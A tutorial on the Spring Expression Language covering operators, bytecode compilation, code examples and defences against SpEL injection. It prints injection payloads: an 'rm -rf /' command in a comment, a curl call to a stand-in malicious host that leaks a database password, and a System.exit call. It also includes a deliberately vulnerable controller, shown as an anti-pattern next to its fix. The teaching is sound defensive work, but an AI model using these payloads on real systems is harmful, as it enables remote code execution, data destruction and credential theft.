# Spring Expression Language (SpEL) & Security

> The comprehensive guide to the Spring Expression Language (SpEL): expression parsing ASTs, safe navigation, collection projection and selection, bytecode compilation via `SpelCompiler`, and mitigating critical SpEL injection vulnerabilities with `SimpleEvaluationContext`.

| Metadata | Value |
| :--- | :--- |
| **Level** | Intermediate |
| **Prerequisites** | [IoC Container & ApplicationContext Internals](file:///03-backend/spring-boot/01-core-spring/01-ioc-container-and-application-context.md) |
| **Time to Read** | 25 minutes |
| **Status** | Complete |
| **Spring Boot Version** | 3.4.x / 4.x |
| **Spring Framework Version** | 6.2.x / 7.0.x |
| **Java Baseline** | Java 21 / 25 LTS |
| **Build Tool** | Maven 3.9+ / Gradle 8.10+ |
| **Tested With** | OpenJDK 25.0.1, Spring Boot 3.4.0 |

---

## Table of Contents
1. [What & Why](#1-what--why)
2. [Core Concepts](#2-core-concepts)
3. [How It Works Internally](#3-how-it-works-internally)
4. [Syntax & Usage](#4-syntax--usage)
5. [Practical Examples](#5-practical-examples)
6. [Best Practices](#6-best-practices)
7. [Common Mistakes & Pitfalls](#7-common-mistakes--pitfalls)
8. [Performance & Security Notes](#8-performance--security-notes)
9. [Comparison / When to Use What](#9-comparison--when-to-use-what)
10. [Interview Questions](#10-interview-questions)
11. [Practice Exercises](#11-practice-exercises)
12. [Summary / Cheat Sheet](#12-summary--cheat-sheet)
13. [Further Reading](#13-further-reading)

---

## 1. What & Why

### Problem Statement
Static configuration properties (`${app.timeout}`) cannot express dynamic calculations, conditional branching, object property navigation, or method evaluations at runtime. Modern enterprise backends require dynamic rule evaluation for Spring Security authorization checks (`@PreAuthorize`), Spring Cache key generation (`@Cacheable`), event filtering (`@EventListener`), and dynamic property bindings.

### Historical Evolution
- **Pre-Spring 3.0**: Developers used Apache OGNL or MVEL, which had inconsistent integration with the Spring BeanFactory.
- **Spring 3.0 (2009)**: Introduced SpEL as a unified expression language integrated directly across the entire Spring portfolio.
- **Spring 4.1**: Introduced the **SpEL Compiler**, which compiles interpreted expressions into direct Java bytecode for near-native performance.
- **Spring 5.x - 6.x**: Hardened SpEL security by introducing `SimpleEvaluationContext` to defend against Remote Code Execution (RCE) vulnerabilities.

### Real-World Relevance
SpEL powers security decisions, caching rules, and configuration interpolation. Understanding how to use it safely—and recognizing the fatal dangers of evaluating unvalidated expressions with `StandardEvaluationContext`—is vital for enterprise security engineers.

---

## 2. Core Concepts

### 1. Property Placeholder (`${...}`) vs. SpEL (`#{...}`)
- **`${property.name}`**: Sourced from the Spring `Environment` / property files. Simple string replacement.
- **`#{expression}`**: A dynamic SpEL expression evaluated against the `EvaluationContext` or bean graph.
- *Combined*: `#{'${app.greeting:Hello}'.toUpperCase()}` (resolves property first, then evaluates SpEL).

### 2. Operators & Navigation
- **Safe Navigation (`?.`)**: Prevents `NullPointerException` (e.g., `user?.address?.city`).
- **Elvis Operator (`?:`)**: Default fallback for null values (e.g., `user.nickname ?: 'Anonymous'`).
- **Collection Selection (`.?[condition]`)**: Filters a collection returning matching elements.
- **Collection Projection (`.![property]`)**: Maps a collection extracting a specific field.

### 3. `EvaluationContext`: Security Boundaries
- **`StandardEvaluationContext` (DANGEROUS with user input)**: Provides full access to Java reflection, arbitrary class instantiations (`T(java.lang.Runtime).getRuntime().exec(...)`), and bean references.
- **`SimpleEvaluationContext` (SAFE)**: Highly restricted context. Disallows arbitrary Java type instantiation, method reflection, and system access; supports only safe data binding.

---

## 3. How It Works Internally

### SpEL AST Parsing and Bytecode Compilation Engine

```
+-------------------------------------------------------------------------+
|                  SpEL Expression String: "orders.?[amount > 100]"       |
+------------------------------------+------------------------------------+
                                     |
                                     v
+-------------------------------------------------------------------------+
|                  1. Expression Parser (SpelExpressionParser)            |
|  - Tokenizes string into lexical tokens                                 |
|  - Builds Abstract Syntax Tree (AST): `OpCollectionSelection` node     |
+------------------------------------+------------------------------------+
                                     |
                                     v
+-------------------------------------------------------------------------+
|                  2. Interpreted Evaluation (Initial Runs)               |
|  - Traverses AST nodes against root object in EvaluationContext         |
|  - Evaluates dynamically using reflection                               |
+------------------------------------+------------------------------------+
                                     |
            If expression executes repeatedly (>100 times)
            and `SpelCompilerMode.IMMEDIATE` or `MIXED` is active
                                     |
                                     v
+-------------------------------------------------------------------------+
|                  3. Bytecode Compilation (SpelCompiler)                 |
|  - Generates JVM bytecode class implementing `CompiledExpression`       |
|  - Replaces interpreted AST traversal with direct JVM method calls!     |
|  - Execution performance matches native hand-written Java code!         |
+-------------------------------------------------------------------------+
```

---

## 4. Syntax & Usage

### Declarative In-Bean Evaluation
```java
@Component
public class ServerConfig {

    // Resolves random UUID at startup
    @Value("#{T(java.util.UUID).randomUUID().toString()}")
    private String serverId;

    // Elvis operator fallback
    @Value("#{systemProperties['user.timezone'] ?: 'UTC'}")
    private String timezone;

    // Bean method invocation
    @Value("#{orderService.calculateGlobalDiscount(100.0)}")
    private double defaultDiscount;
}
```

### Programmatic Evaluation with Safe Context
```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("name");

// SAFE: SimpleEvaluationContext prevents RCE attacks
EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
String name = exp.getValue(context, userObject, String.class);
```

---

## 5. Practical Examples

### Example 1: Programmatic SpEL Evaluation with Type-Safety
```java
package com.example.demo.spel;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;

public class BasicSpelDemo {

    public record Account(String owner, double balance, boolean active) {}

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        Account account = new Account("Alice", 1500.75, true);

        // Safe evaluation context restricted to read-only data access
        var context = SimpleEvaluationContext.forReadOnlyDataBinding().build();

        // 1. Property navigation
        Expression nameExp = parser.parseExpression("owner");
        String name = nameExp.getValue(context, account, String.class);
        System.out.println("Owner: " + name);

        // 2. Boolean expression
        Expression eligibleExp = parser.parseExpression("balance > 1000 and active");
        Boolean isEligible = eligibleExp.getValue(context, account, Boolean.class);
        System.out.println("VIP Eligible: " + isEligible);
    }
}
```

### Example 2: Collection Selection (`.?`) and Projection (`.!`)
```java
package com.example.demo.spel;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

import java.util.List;

public class SpelCollectionOperations {

    public record Product(String name, double price, String category) {}

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();

        List<Product> catalog = List.of(
            new Product("Gaming Laptop", 1200.0, "Electronics"),
            new Product("Mousepad", 25.0, "Accessories"),
            new Product("4K Monitor", 450.0, "Electronics"),
            new Product("USB Cable", 12.0, "Accessories")
        );

        var context = new StandardEvaluationContext();
        context.setVariable("catalog", catalog);

        // 1. Selection (.?[condition]): Filter products > $100 in Electronics
        String selectionQuery = "#catalog.?[category == 'Electronics' and price > 200]";
        List<Product> premiumElectronics = (List<Product>) parser.parseExpression(selectionQuery).getValue(context);
        System.out.println("Selected Products: " + premiumElectronics);

        // 2. Projection (.![property]): Extract only names
        String projectionQuery = "#catalog.![name]";
        List<String> productNames = (List<String>) parser.parseExpression(projectionQuery).getValue(context);
        System.out.println("Projected Names: " + productNames);
    }
}
```

### Example 3: Safe Navigation (`?.`) and Elvis Operator (`?:`)
```java
package com.example.demo.spel;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;

public class SafeNavigationDemo {

    public record Address(String city) {}
    public record Customer(String name, Address address) {}

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        var context = SimpleEvaluationContext.forReadOnlyDataBinding().build();

        Customer customerWithNoAddress = new Customer("Bob", null);

        // Safe Navigation (?.) prevents NullPointerException on null address
        // Elvis operator (?:) supplies fallback string
        String expr = "address?.city ?: 'City Not Specified'";
        
        String city = parser.parseExpression(expr).getValue(context, customerWithNoAddress, String.class);
        System.out.println("Resolved City: " + city); // Prints: City Not Specified
    }
}
```

### Example 4: Critical Security Anti-Pattern & Remediation (SpEL Injection RCE)
```java
// ANTI-PATTERN: Evaluating untrusted user input using StandardEvaluationContext
public class VulnerableReportController {

    private final ExpressionParser parser = new SpelExpressionParser();

    public Object generateCustomMetric(String userSuppliedSpelExpression, Object data) {
        // FATAL VULNERABILITY: StandardEvaluationContext permits arbitrary Java code execution!
        // An attacker passes: "T(java.lang.Runtime).getRuntime().exec('rm -rf /')"
        // RESULT: REMOTE CODE EXECUTION (RCE) on the server!
        StandardEvaluationContext dangerousContext = new StandardEvaluationContext(data);
        return parser.parseExpression(userSuppliedSpelExpression).getValue(dangerousContext);
    }
}

// REMEDIATION: Strictly use SimpleEvaluationContext for any external/user-provided expressions
public class SecureReportController {

    private final ExpressionParser parser = new SpelExpressionParser();

    public Object generateCustomMetric(String userSuppliedSpelExpression, Object data) {
        // SECURE: SimpleEvaluationContext disallows Java type access (T(...)), constructor calls, and reflection
        SimpleEvaluationContext safeContext = SimpleEvaluationContext
            .forReadOnlyDataBinding()
            .withRootObject(data)
            .build();

        try {
            return parser.parseExpression(userSuppliedSpelExpression).getValue(safeContext);
        } catch (org.springframework.expression.spel.SpelEvaluationException ex) {
            throw new IllegalArgumentException("Forbidden or malformed expression: " + ex.getMessage());
        }
    }
}
```

### Example 5: High-Performance SpEL Compiler Configuration
```java
package com.example.demo.spel;

import org.springframework.expression.Expression;
import org.springframework.expression.spel.SpelCompilerMode;
import org.springframework.expression.spel.SpelParserConfiguration;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class CompiledSpelDemo {

    public record Transaction(double amount, double taxRate) {
        public double calculateTotal() { return amount + (amount * taxRate); }
    }

    public static void main(String[] args) {
        // Configure SpEL compiler: IMMEDIATE mode compiles AST to bytecode on first run
        SpelParserConfiguration config = new SpelParserConfiguration(
            SpelCompilerMode.IMMEDIATE, 
            CompiledSpelDemo.class.getClassLoader()
        );

        SpelExpressionParser parser = new SpelExpressionParser(config);
        Expression expression = parser.parseExpression("calculateTotal()");

        Transaction txn = new Transaction(100.0, 0.20);

        // First execution compiles to direct bytecode
        Double total = expression.getValue(txn, Double.class);
        System.out.println("Calculated Total (Bytecode Compiled): " + total);
    }
}
```

---

## 6. Best Practices

1. **Never Pass User Input to `StandardEvaluationContext`**: If expressions originate from users, query parameters, or external APIs, use strictly `SimpleEvaluationContext.forReadOnlyDataBinding()`.
2. **Combine Property Placeholders with SpEL**: Use `#{'${my.prop}'.split(',')}` to parse comma-separated environment variables into arrays or lists cleanly.
3. **Use Safe Navigation (`?.`) Everywhere**: In SpEL expressions accessing nested properties, always use `?.` to prevent sporadic production `NullPointerException`s when optional fields are null.
4. **Cache Parsed `Expression` Instances**: Parsing an expression string into an AST incurs CPU overhead. Parse the expression once and reuse the compiled `Expression` instance across requests.
5. **Enable `SpelCompilerMode.MIXED` in High-Throughput Paths**: In high-throughput rules engines, configure the SpEL compiler to generate bytecode after initial interpretation runs.
6. **Prefer Plain Java for Complex Domain Logic**: SpEL is designed for configuration and declarative metadata. Writing complex 10-line algorithmic logic in SpEL expressions is an anti-pattern; write plain Java methods and invoke them via SpEL instead.

---

## 7. Common Mistakes & Pitfalls

| Mistake | Why It Fails | Practical Remedy |
| :--- | :--- | :--- |
| **SpEL Injection leading to RCE** | Evaluating untrusted input with `StandardEvaluationContext` lets attackers run shell commands via `T(Runtime)`. | Replace with `SimpleEvaluationContext.forReadOnlyDataBinding()`. |
| **Confusing `${}` with `#{}`** | `${user.name}` looks for a config property named `user.name`; `#{user.name}` evaluates the bean property `name`. | Use `${}` for property files and `#{}` for dynamic bean expressions. |
| **Missing Safe Navigation (`?.`)** | Calling `#{order.customer.email}` throws `SpelEvaluationException` if `customer` is null. | Write `#{order.customer?.email}`. |
| **Parsing expressions inside tight loops** | Calling `parser.parseExpression(expr)` inside a `for` loop re-parses the AST on every iteration. | Parse once outside the loop and call `expression.getValue()` repeatedly. |
| **Case sensitivity in SpEL** | SpEL property and method names are case-sensitive (`getAmount()` vs `getamount()`). | Ensure exact casing matches Java bean getter/field names. |
| **Array index out of bounds** | Accessing `list[10]` on a 2-element list throws `IndexOutOfBoundsException`. | Guard with collection size check or use collection selection (`.?`). |

---

## 8. Performance & Security Notes

### The Anatomy of SpEL Injection Attacks
Attackers exploit SpEL's `T(...)` syntax, which allows loading any Java class on the classpath:
```text
T(java.lang.Runtime).getRuntime().exec("curl https://malicious.site/leak?d=" + systemProperties['DB_PASS'])
```
`SimpleEvaluationContext` permanently blocks this attack vector by disabling type resolution and reflection invocation entirely.

### SpEL Compiler Modes
- `OFF` (Default): Interpreted AST evaluation.
- `IMMEDIATE`: Compiles expression to bytecode on the very first evaluation.
- `MIXED`: Interprets initially; compiles to bytecode after the expression proves to be heavily executed (>100 calls), balancing startup time with peak throughput.

---

## 9. Comparison / When to Use What

| Feature | Property Placeholder (`${...}`) | SpEL (`#{...}`) | Plain Java Code |
| :--- | :--- | :--- | :--- |
| **Evaluation Timing** | Application Startup | Runtime / Startup | Compile-time |
| **Dynamic Calculation** | None (Static String) | Yes (Arithmetic, logic) | Full Turing-complete |
| **Method Invocations** | No | Yes | Yes |
| **Execution Speed** | Instant (String map lookup) | Fast (Compiled bytecode)| Fastest (Native JVM bytecode) |
| **Primary Use Case** | Reading configuration YAML | `@PreAuthorize`, `@Cacheable` | Core domain business rules |

---

## 10. Interview Questions

<details>
<summary><strong>Q1: What is the difference between `${...}` and `#{...}` in Spring?</strong></summary>

**Answer:**  
- `${property.name}`: Property Placeholder syntax. It resolves static configuration values from Spring's `Environment` (e.g., `application.yaml`, system properties).
- `#{expression}`: SpEL (Spring Expression Language) syntax. It dynamically evaluates an expression against the runtime bean graph, supporting arithmetic, method calls, and safe navigation.
</details>

<details>
<summary><strong>Q2: What is SpEL Injection and how can it lead to Remote Code Execution (RCE)?</strong></summary>

**Answer:**  
SpEL Injection occurs when untrusted user input is passed directly to `parser.parseExpression()` and evaluated against a `StandardEvaluationContext`. Because `StandardEvaluationContext` allows the `T(...)` operator, an attacker can invoke arbitrary Java classes (such as `T(java.lang.Runtime).getRuntime().exec(...)`), allowing them to execute arbitrary system shell commands on the hosting server.
</details>

<details>
<summary><strong>Q3: How do you prevent SpEL Injection vulnerabilities?</strong></summary>

**Answer:**  
Always evaluate untrusted user expressions using `SimpleEvaluationContext` (e.g., `SimpleEvaluationContext.forReadOnlyDataBinding().build()`). `SimpleEvaluationContext` explicitly disallows Java type access (`T(...)`), constructor invocations, and arbitrary reflection, restricting evaluation strictly to safe property path access.
</details>

<details>
<summary><strong>Q4: What is the SpEL Safe Navigation operator and how does it work?</strong></summary>

**Answer:**  
The safe navigation operator is `?.` (inspired by Groovy and Kotlin). It checks if the target object is null before attempting to access its property or method. If the object is null, the expression evaluates to `null` immediately instead of throwing a `NullPointerException` (e.g., `order?.customer?.address?.zipCode`).
</details>

<details>
<summary><strong>Q5: What are SpEL Collection Selection (`.?`) and Collection Projection (`.!`)?</strong></summary>

**Answer:**  
- **Collection Selection (`.?[]`)**: Filters a collection returning a new collection of elements that satisfy the predicate (e.g., `orders.?[amount > 500]`).
- **Collection Projection (`.![]`)**: Transforms a collection by extracting a property from each element, returning a list of values (e.g., `users.![email]`).
</details>

<details>
<summary><strong>Q6: How does the SpEL Compiler improve performance?</strong></summary>

**Answer:**  
By default, SpEL interprets expressions by walking an Abstract Syntax Tree (AST), which relies on reflection and dynamic lookups. When `SpelCompilerMode.IMMEDIATE` or `MIXED` is enabled, the `SpelCompiler` dynamically generates raw Java bytecode for the expression. Once compiled, the expression executes as native JVM bytecodes without reflection overhead, achieving speeds comparable to hand-written Java code.
</details>

<details>
<summary><strong>Q7: What is the Elvis operator (`?:`) in SpEL?</strong></summary>

**Answer:**  
The Elvis operator (`?:`) is a shorthand ternary operator used to specify default fallback values when an expression evaluates to `null`:
```java
String result = customer.nickname ?: 'Guest';
```
If `customer.nickname` is non-null, its value is used; otherwise, `'Guest'` is returned.
</details>

<details>
<summary><strong>Q8: Can SpEL access Spring beans directly in an expression? How?</strong></summary>

**Answer:**  
Yes. In an `ApplicationContext` environment, beans can be referenced using the `@` symbol (e.g., `@orderService.isValid(orderId)`) or `&` for factory beans (e.g., `&myFactoryBean`).
</details>

---

## 11. Practice Exercises

<details>
<summary><strong>Exercise 1: Basic Math & String SpEL in `@Value` (Easy)</strong></summary>

**Task:**  
Inject a calculated property `@Value("#{24 * 60 * 60 * 1000}")` representing seconds in a day into an `int` field. Verify the injected value equals `86400000`.
</details>

<details>
<summary><strong>Exercise 2: Safe Navigation with Elvis Fallback (Easy)</strong></summary>

**Task:**  
Evaluate the expression `user?.profile?.theme ?: 'DARK_MODE'` using `SpelExpressionParser` against a user object whose profile is null. Assert that the returned string is `'DARK_MODE'`.
</details>

<details>
<summary><strong>Exercise 3: Collection Filtering with Selection (Medium)</strong></summary>

**Task:**  
Create a list of 5 employee records with `name` and `salary`. Use SpEL collection selection `.?` to filter employees earning more than $75,000, and projection `.!` to extract their names.
</details>

<details>
<summary><strong>Exercise 4: Benchmark Interpreted vs Compiled SpEL (Medium)</strong></summary>

**Task:**  
Write a micro-benchmark evaluating a complex SpEL math expression 100,000 times: once with default interpreted mode and once with `SpelCompilerMode.IMMEDIATE`. Compare execution times.
</details>

<details>
<summary><strong>Exercise 5: Build a Safe Dynamic Rule Filter (Hard)</strong></summary>

**Task:**  
Create a dynamic rule evaluation service that accepts user-defined filter expressions (e.g., `status == 'PENDING' and total > 50`). Enforce `SimpleEvaluationContext` and verify that attempting to pass `T(java.lang.System).exit(0)` throws an exception without crashing the JVM.
</details>

<details>
<summary><strong>Exercise 6: Dynamic Cache Key Generation with SpEL (Hard)</strong></summary>

**Task:**  
Implement a custom method interceptor that evaluates a SpEL key expression (e.g., `#user.id + '_' + #tenantId`) against method arguments to compute dynamic cache keys.
</details>

---

## 12. Summary / Cheat Sheet

| SpEL Feature / Operator | Syntax Example | Meaning |
| :--- | :--- | :--- |
| **Safe Navigation** | `user?.address?.city` | Returns null if intermediate object is null |
| **Elvis Operator** | `user.nickname ?: 'Anonymous'` | Returns fallback if left side is null |
| **Collection Selection** | `orders.?[amount > 100]` | Filters collection by predicate |
| **Collection Projection** | `users.![email]` | Extracts specific property from collection |
| **Bean Reference** | `@orderService.isAvailable()` | Calls method on managed Spring bean |
| **Static Class Reference**| `T(java.lang.Math).PI` | Accesses static fields or methods (**RCE risk!**) |
| **Safe Evaluation** | `SimpleEvaluationContext` | **Mandatory context when handling user input** |

---

## 13. Further Reading
- [Official Spring Framework Reference: Spring Expression Language (SpEL)](https://docs.spring.io/spring-framework/reference/core/expressions.html)
- [OWASP SpEL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Spring_Framework_Cheat_Sheet.html)
- [Spring SpelCompiler Javadoc](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/SpelCompilerMode.html)
